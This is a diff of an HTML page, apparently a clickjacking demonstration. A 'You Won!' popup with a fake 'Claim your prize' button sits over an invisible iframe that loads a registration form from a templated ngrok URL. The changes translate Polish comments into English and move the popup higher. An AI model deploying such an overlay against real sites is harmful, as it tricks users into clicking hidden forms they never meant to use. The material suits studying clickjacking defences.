@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>You Won!</title>
     <style>
-        /* Ustawienie kontenera na środku ekranu */
+        /* positioning the container in the centre of the screen */
         body {
             display: flex;
             justify-content: center;
@@ -16,7 +16,7 @@
             background-color: #f0f0f0;
         }
 
-        /* Styl iframe, bez cienia i zaokrągleń */
+        /* iframe style, no shadow or rounding */
         iframe {
             width: 90vw;
             max-width: 600px;
@@ -28,10 +28,10 @@
             z-index: 1;
         }
 
-        /* Styl okna popup z cieniem, aby się wyróżniało */
+        /* style a popup window with a shadow to make it stand out */
         .popup {
             position: absolute;
-            top: 50%;
+            top: 30%;
             left: 50%;
             transform: translate(-50%, -50%);
             width: 300px;
@@ -44,7 +44,7 @@
             z-index: 2;
         }
 
-        /* Nagłówek w popup */
+        /* headline in popup */
         .popup .message {
             font-size: 1.5em;
             font-weight: bold;
@@ -52,7 +52,7 @@
             margin-bottom: 15px;
         }
 
-        /* Przycisk w popup */
+        /* button in popup */
         .popup .fake-button {
             padding: 10px 20px;
             font-size: 1.2em;
@@ -66,10 +66,10 @@
 </head>
 <body>
     <div class="container">
-        <!-- Embedding the registration form in an iframe without scrolling -->
+        <!-- embedding the registration form in an iframe without scrolling -->
         <iframe id="targetFrame" src="{{ ngrok_url }}/register_html" frameborder="0" scrolling="no"></iframe>
 
-        <!-- Popup with a fake message and a button in the middle of the screen -->
+        <!-- popup with a fake message and a button in the middle of the screen -->
         <div class="popup">
             <div class="message">You Won!</div> <!-- False headline -->
             <button class="fake-button" onclick="claimPrize()">Claim your prize</button> <!-- False button -->
